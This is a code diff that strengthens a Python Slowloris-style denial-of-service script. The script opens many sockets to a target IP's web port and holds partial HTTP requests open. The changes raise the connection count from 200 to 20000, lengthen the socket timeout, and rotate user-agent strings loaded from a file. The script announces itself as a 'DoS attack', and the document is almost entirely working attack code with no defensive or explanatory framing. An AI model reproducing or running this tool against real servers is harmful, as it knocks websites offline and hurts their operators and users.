@@ -1,20 +1,28 @@
 import socket, random, time, sys
-
+"""
 headers = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Accept-language: en-US,en"
 ]
-
+"""
 sockets = []
+headers = []
+
+def setupHeaders():
+    f = open("User_agents.txt",'r')
+    for i in f:
+        headers.append(i.strip())
+setupHeaders()
 
 def setupSocket(ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(4)
+    sock.settimeout(300)
     sock.connect((ip, 80))
     sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
+    header = random.choice(headers)
 
-    for header in headers:
-        sock.send("{}\r\n".format(header).encode("utf-8"))
+
+    sock.send("{}\r\n".format(header).encode("utf-8"))
 
     return sock
 
@@ -24,7 +32,7 @@ if __name__ == "__main__":
         sys.exit()
 
     ip = sys.argv[1]
-    count = 200
+    count = 20000
     print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
 
     for _ in range(count):
@@ -54,4 +62,4 @@ if __name__ == "__main__":
             except socket.error:
                 break
                 
-        time.sleep(10)
+        time.sleep(20)
